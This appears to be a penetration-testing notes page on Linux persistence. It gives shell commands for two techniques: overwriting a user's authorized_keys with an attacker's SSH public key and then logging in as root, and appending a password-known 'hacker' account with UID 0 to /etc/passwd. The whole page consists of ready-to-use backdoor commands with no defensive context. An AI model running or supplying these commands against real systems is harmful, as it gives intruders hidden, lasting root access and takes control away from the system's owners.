#linux #persiatance 

### SSH Persistence

```bash
cat /home/kali/.ssh/id_rsa.pub
```

1. Add to the users directory that you need to SSH as

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCFhFRSqewzmooax5glwkwTl6wA3gRYyKRZMQ98axKxYYQiXhtIddN4BJPz7mPC53ARxTOqNqQOX1bcTy1yDmKLS3lccyX26rmPAwPO7l3kqHqL8RKPmsuuXqE6W51sctIsUKIpP2tTeE68J5Ap5doqxERZloA2P+NdF1+yU4Kv9mjiIKjH8bXnR56eqzJMiBzF0OxDhS0ZkwAMegm5Za8x3uQpe0OCL/zaPz3KCcnAHoThyXtFsBAnSqyr5jrfq458KsqCOhxk4NOs8HbEDKuWHqax1dcQ+2q+4GoEVlpNU33XJkGDispZmAtxmqFwJm+36JMmDtIIAxl+25D5lSz7TkeJ4I/QKVFosV8wnghDIXwBBEhajk8ZwqcpHf7B+ZPNSz652Hna9IMSgxZXfYXRRXd388Wq/2wOwrcLNTvWV3WY5B8Fv1LrtW1qt9DfxpgssPaUjyj5Eqp0boYKv402LFnC0zWw2/joN+9eu5/kP+NRvVwHsyp+tN6I9Oc+Fs= kali@kali" > /home/user/.ssh/authorized_keys
```

2.  Connect with the private key

```bash
ssh -p 2222 -i /home/kali/.ssh/id_rsa root@192.168.216.246
```



### Adding a backdoor User

```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```

then 

```bash
su - hacker
```
